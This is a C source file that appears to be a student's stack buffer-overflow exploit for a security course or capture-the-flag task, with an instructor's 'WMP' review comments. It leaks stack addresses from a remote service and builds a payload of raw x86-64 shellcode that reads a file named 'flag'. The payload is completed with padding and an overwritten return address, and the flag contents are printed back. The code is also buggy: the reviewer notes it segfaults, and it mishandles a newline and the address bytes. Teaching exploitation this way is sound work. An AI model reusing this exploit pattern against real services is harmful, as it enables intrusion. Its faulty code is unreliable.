#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

/*
 * WMP: Compiler warnings:
 * shellcode.c: In function ‘main’:
 * shellcode.c:113:100: warning: multi-character character constant [-Wmultichar]
 *   113 |     memcpy(buffer + 124 + sizeof(file_name) + sizeof(spacer) + sizeof(bp_addr) + sizeof(buf_addr), '/n', 1);
 *       |                                                                                                    ^~~~
 * shellcode.c:113:100: warning: passing argument 2 of ‘memcpy’ makes pointer from integer without a cast [-Wint-conversion]
 *   113 |     memcpy(buffer + 124 + sizeof(file_name) + sizeof(spacer) + sizeof(bp_addr) + sizeof(buf_addr), '/n', 1);
 *       |                                                                                                    ^~~~
 *       |                                                                                                    |
 *       |                                                                                                    int
 * In file included from shellcode.c:3:
 * /usr/include/string.h:43:70: note: expected ‘const void * restrict’ but argument is of type ‘int’
 *    43 | extern void *memcpy (void *__restrict __dest, const void *__restrict __src,
 *       |
 */

// WMP: ^---- '\n' is a character, not a char * pointing to one char; use "\n".
// WMP: Segfaults. Did you use GDB to diagnose?

int main(int argc, char **argv) {
	if (argc != 3) {
        fprintf(stderr, "Not enough arguments.\n");
        return 1;
    }

    int rc, fd = -1;
    ssize_t size;
    char buf[1024];
    struct addrinfo hints = { .ai_socktype = SOCK_STREAM };
    struct addrinfo *info = NULL, *p;
    int exit_code = EXIT_FAILURE;

    char buf_addr[8];
    char bp_addr[8];


    unsigned long buf_addr_l;
    unsigned long  bp_addr_l;

    // lookup service
    rc = getaddrinfo(argv[1], argv[2], &hints, &info);
    if (0 != rc) {
        fprintf(stderr, "error looking up %s\n", argv[1]);
        goto done;
    }

    // connect to service
    for (p = info; p; p = p->ai_next) {
        fd = socket(p->ai_family, p->ai_socktype, 0);
        if (-1 == fd) {
            continue;
        }

        rc = connect(fd, p->ai_addr, p->ai_addrlen);
        if (rc > -1) {
            break;
        }
    }

    char *buffer_str;
    char *bp_str;
    // read bytes from service 
    for (;;) {
        size = recv(fd, buf, sizeof(buf), 0);
        if (0 == size) {
            break;
        } else if (size > 0) {
            buffer_str = strstr(buf, "buffer: ");
            bp_str = strstr(buf, "bp: ");

            if (buffer_str && bp_str) {
                buf_addr_l = strtoul(buffer_str + strlen("buffer: "), NULL, 16);
                bp_addr_l = strtoul(bp_str + strlen("bp: "), NULL, 16);
                snprintf(buf_addr, sizeof(buf_addr), "%ld", buf_addr_l);
                snprintf(bp_addr, sizeof(bp_addr), "%ld", bp_addr_l);
                break;
            }

        } else {
            perror("error reading from connection");
            goto done;
        }
    }

    /**
     * fill buffer
     */
    char buffer[1024];
    char file_name[] = "flag";
    char spacer[100];

    char shell_code[] =
    "\x48\xc7\xc0\x02\x00\x00\x00\x48" // WMP: Some commentary
    "\xc7\xc6\x00\x00\x00\x00\x48\x8d" // would go
    "\x7c\x24\xfc\x0f\x05\x48\x89\xc7" // a long way.
    "\x48\x31\xc0\x48\x89\xff\x48\x8d"
    "\x74\x24\xbc\x48\xc7\xc2\x80\x00"
    "\x00\x00\x0f\x05\x48\xc7\xc0\x01" // WMP: You could also break these lines on
    "\x00\x00\x00\x48\xc7\xc7\x01\x00" // instruction boundaries to help
    "\x00\x00\x48\x8d\x74\x24\xbc\x48" // with comprehension.
    "\xc7\xc2\x80\x00\x00\x00\x0f\x05"
    "\x48\xc7\xc0\x03\x00\x00\x00\x48"
    "\x31\xff\x48\xc7\xc0\x3c\x00\x00"
    "\x00\x0f\x05"
    ;

    memset(spacer, 'B', 100);

    // WMP: This all looks reasonable.
    // Good to use sizeof to avoid arithmetic errors on your part.

    // put shellcode in buf
    memcpy(buffer, shell_code, sizeof(shell_code));
    // fill buffer with A's until the flag file name
    memset(buffer + sizeof(shell_code), 'A', 124 - sizeof(shell_code));
    /**
    * this is where i would store my assemblh code's buffer space at the end of the buffer
    // memcpy(buffer + 124 + sizeof(file_name), spacer, sizeof(spacer));
    */
    // put in file name
    memcpy(buffer + 124, file_name, sizeof(file_name));
    // put bp on buffer
    memcpy(buffer + 124 + sizeof(file_name) + sizeof(spacer), bp_addr, sizeof(bp_addr));
    // put addr of beginning of buffer at the end of the overflow
    memcpy(buffer + 124 + sizeof(file_name) + sizeof(spacer) + sizeof(bp_addr), buf_addr, sizeof(buf_addr));
    // add newline to the end of the buffer
    memcpy(buffer + 124 + sizeof(file_name) + sizeof(spacer) + sizeof(bp_addr) + sizeof(buf_addr), '/n', 1);
    
    // send data
    ssize_t bytes_sent = send(fd, buffer, strlen(buffer), 0);
    if (bytes_sent == -1) {
        perror("Send failed");
        goto done;
    }

    // receive the file contents
    for (;;) {
        size = recv(fd, buf, sizeof(buf), 0);
        if (0 == size) {
            break;
        } else if (size > 0) {
            write(STDOUT_FILENO, buf, size);
        } else {
            perror("error reading from connection");
            goto done;
        }
    }
        
    // exit
    exit_code = EXIT_SUCCESS;

done:
    if (fd != -1) {
        close(fd);
    }

    exit(exit_code);

    return 0;
}
